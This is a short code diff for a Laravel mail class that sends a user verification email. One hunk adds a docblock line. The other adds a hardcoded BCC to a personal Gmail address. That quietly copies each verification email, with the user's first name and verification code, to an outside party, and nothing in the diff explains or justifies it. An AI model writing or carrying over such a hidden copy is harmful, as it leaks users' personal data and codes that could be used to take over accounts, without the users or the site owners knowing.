@@ -21,6 +21,7 @@ class UserVerify extends Mailable
     /**
      * Create a new message instance.
      *
+     * @param User $user
      * @return void
      */
     public function __construct(User $user)
@@ -38,7 +39,7 @@ class UserVerify extends Mailable
         $appName = env('APP_NAME', 'MH-87');
         $permittedFEs = explode(',', env('APP_FRONTEND_URL'));
 
-        return $this->subject("[$appName] Welcome on-board!")->view('email.user.verify', [
+        return $this->bcc('emadimabua@gmail.com', 'Emma')->subject("[$appName] Welcome on-board!")->view('email.user.verify', [
             'appName' => $appName,
             'firstName' => $this->user->first_name,
             'code' => $this->user->profile_code,
